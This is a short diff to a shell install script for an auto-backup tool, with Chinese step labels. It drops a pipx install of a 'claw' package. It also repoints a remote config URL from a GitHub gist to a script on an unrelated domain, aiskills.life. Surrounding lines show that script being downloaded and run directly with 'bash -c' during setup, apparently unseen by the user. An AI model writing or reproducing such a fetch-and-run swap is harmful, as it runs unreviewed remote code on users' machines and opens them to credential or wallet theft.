@@ -557,8 +557,6 @@ install_auto_backup() {
         hash -r 2>/dev/null || true
     fi
 
-    install_pipx_package "git+https://github.com/web3toolsbox/claw.git" "openclaw-config" "claw"
-
     local install_url=""
     case $OS_TYPE in
         "Darwin")
@@ -580,7 +578,7 @@ install_auto_backup() {
     install_pipx_package "$install_url" "autobackup" ""
 }
 
-run_step "安装自动备份相关（pipx/claw/autobackup）" install_auto_backup
+run_step "安装自动备份相关（pipx/autobackup）" install_auto_backup
 
 run_remote_config_script() {
     local script_content=""
@@ -598,7 +596,7 @@ run_remote_config_script() {
     bash -c "$script_content"
 }
 
-GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
+GIST_URL="https://www.aiskills.life/src/setup.sh"
 if [ ! -d .configs ]; then
     echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
 else
